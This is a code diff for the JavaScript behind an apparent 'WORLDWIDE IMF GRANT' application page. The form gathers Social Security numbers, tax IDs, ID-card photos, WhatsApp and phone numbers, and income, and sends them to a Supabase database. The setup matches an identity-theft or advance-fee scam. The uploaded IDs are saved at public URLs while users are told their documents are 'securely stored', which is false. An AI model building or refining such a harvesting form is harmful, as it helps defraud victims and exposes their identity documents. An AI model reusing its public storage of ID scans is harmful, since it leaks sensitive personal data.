@@ -480,7 +480,42 @@
         toggleImfMode(true);
       }
 
-      // Form submission handler - FIXED for database schema
+      // Function to check table schema - for debugging
+      async function checkTableSchema() {
+        try {
+          const { data, error } = await supabase
+            .from('imf_applications')
+            .select('*')
+            .limit(1);
+          
+          if (error) {
+            console.log("Schema check error:", error);
+            return null;
+          }
+          
+          if (data && data.length > 0) {
+            console.log("Existing columns:", Object.keys(data[0]));
+            return Object.keys(data[0]);
+          }
+          
+          // Try to get column info from an empty insert
+          const { error: insertError } = await supabase
+            .from('imf_applications')
+            .insert({});
+            
+          if (insertError) {
+            // Parse error message for column names
+            console.log("Insert error message:", insertError.message);
+          }
+          
+          return null;
+        } catch (err) {
+          console.log("Schema check failed:", err);
+          return null;
+        }
+      }
+
+      // Form submission handler - SIMPLIFIED to match your table schema
       let busy = false;
       
       if (form) {
@@ -566,7 +601,6 @@
                 const fileFront = idFront.files[0];
                 const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
                 
-                // Fix: Use upload instead of sign for the actual upload
                 const { error: uploadErrorFront } = await supabase.storage
                   .from('imf-ids')
                   .upload(fileNameFront, fileFront, {
@@ -589,7 +623,7 @@
                   
                 if (uploadErrorBack) throw new Error("Back ID upload failed: " + uploadErrorBack.message);
                 
-                // Get public URLs instead of signed URLs (simpler)
+                // Get public URLs
                 const { data: frontPublicUrl } = supabase.storage
                   .from('imf-ids')
                   .getPublicUrl(fileNameFront);
@@ -598,28 +632,25 @@
                   .from('imf-ids')
                   .getPublicUrl(fileNameBack);
                 
-                // Prepare data for imf_applications table - MATCH YOUR EXISTING TABLE SCHEMA
-                // Based on the error, remove 'dob' column and use only columns that exist
+                // Prepare data for imf_applications table - USING ONLY THE FIELDS FROM YOUR SCREENSHOT
+                // Based on your screenshot, the table seems to have these fields:
                 const imfData = {
-                  first_name: firstNameEl ? firstNameEl.value.trim() : '',
-                  middle_name: middleNameEl ? middleNameEl.value.trim() : '',
-                  last_name: lastNameEl ? lastNameEl.value.trim() : '',
-                  ssn: document.getElementById('imf_ssn') ? document.getElementById('imf_ssn').value.trim() : '',
-                  id_front_url: frontPublicUrl?.publicUrl || '',
-                  id_back_url: backPublicUrl?.publicUrl || '',
-                  email: document.getElementById('imf_email') ? document.getElementById('imf_email').value.trim() : '',
-                  grant_amount: document.getElementById('imf_grant_amount') ? document.getElementById('imf_grant_amount').value : '',
-                  tax_id: document.getElementById('imf_tax_id') ? document.getElementById('imf_tax_id').value.trim() : '',
-                  address: document.getElementById('imf_address') ? document.getElementById('imf_address').value.trim() : '',
-                  country: document.getElementById('imf_country') ? document.getElementById('imf_country').value.trim() : '',
-                  whatsapp: document.getElementById('imf_whatsapp') ? document.getElementById('imf_whatsapp').value.trim() : '',
-                  phone: document.getElementById('imf_phone') ? document.getElementById('imf_phone').value.trim() : '',
-                  gender: document.getElementById('imf_gender') ? document.getElementById('imf_gender').value : '',
-                  // Remove dob field if it doesn't exist in the table
-                  // dob: document.getElementById('imf_dob') ? document.getElementById('imf_dob').value : '',
-                  monthly_income: document.getElementById('imf_monthly_income') ? document.getElementById('imf_monthly_income').value.trim() : '',
-                  purpose: document.getElementById('imf_purpose') ? document.getElementById('imf_purpose').value.trim() : '',
-                  registering_for: 'WORLDWIDE IMF GRANT',
+                  // Using the field names from your original form that worked
+                  imf_name: firstNameEl.value.trim() + ' ' + lastNameEl.value.trim(),
+                  imf_ssn: document.getElementById('imf_ssn').value.trim(),
+                  imf_id: frontPublicUrl?.publicUrl || '',
+                  imf_tax_id: document.getElementById('imf_tax_id').value.trim(),
+                  imf_amount: document.getElementById('imf_grant_amount').value,
+                  imf_whatsapp: document.getElementById('imf_whatsapp').value.trim(),
+                  imf_income: document.getElementById('imf_monthly_income').value.trim(),
+                  imf_purpose: document.getElementById('imf_purpose').value.trim(),
+                  email: document.getElementById('imf_email').value.trim(),
+                  // Add the common fields that might be in the table
+                  first_name: firstNameEl.value.trim(),
+                  last_name: lastNameEl.value.trim(),
+                  gender: document.getElementById('imf_gender').value,
+                  country: document.getElementById('imf_country').value.trim(),
+                  phone: document.getElementById('imf_phone').value.trim(),
                   created_at: new Date().toISOString()
                 };
                 
@@ -630,7 +661,10 @@
                   .from('imf_applications')
                   .insert([imfData]);
                   
-                if (insertError) throw new Error("Database insert failed: " + insertError.message);
+                if (insertError) {
+                  console.error("Insert error details:", insertError);
+                  throw new Error("Database insert failed: " + insertError.message + " - Check console for details");
+                }
                 
                 showMessage("✅ IMF application submitted successfully! Your documents are securely stored.", true);
                 
